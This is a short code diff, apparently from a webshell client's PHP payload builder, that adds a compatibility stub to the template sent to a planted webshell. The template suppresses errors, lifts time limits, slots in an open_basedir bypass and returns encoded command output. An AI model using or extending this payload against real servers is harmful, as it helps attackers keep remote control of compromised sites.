@@ -116,7 +116,7 @@ class PHP extends Base {
             break;
         };
     };`.replace(/\n\s+/g, '');
-    data['_'] = `@ini_set("display_errors", "0");@set_time_limit(0);${bypassOpenBaseDirCode};${asencCode};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "${tag_s.substr(0,tag_s.length/2)}"."${tag_s.substr(tag_s.length/2)}";echo @asenc($output);echo "${tag_e.substr(0,tag_e.length/2)}"."${tag_e.substr(tag_e.length/2)}";}ob_start();try{${tmpCode};}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();`;
+    data['_'] = `@ini_set("display_errors", "0");@set_time_limit(0);if(!function_exists("get_magic_quotes_gpc")){function get_magic_quotes_gpc(){return 0;}};${bypassOpenBaseDirCode};${asencCode};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "${tag_s.substr(0,tag_s.length/2)}"."${tag_s.substr(tag_s.length/2)}";echo @asenc($output);echo "${tag_e.substr(0,tag_e.length/2)}"."${tag_e.substr(tag_e.length/2)}";}ob_start();try{${tmpCode};}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();`;
 
     // 使用编码器进行处理并返回
     return this.encodeComplete(tag_s, tag_e, data);
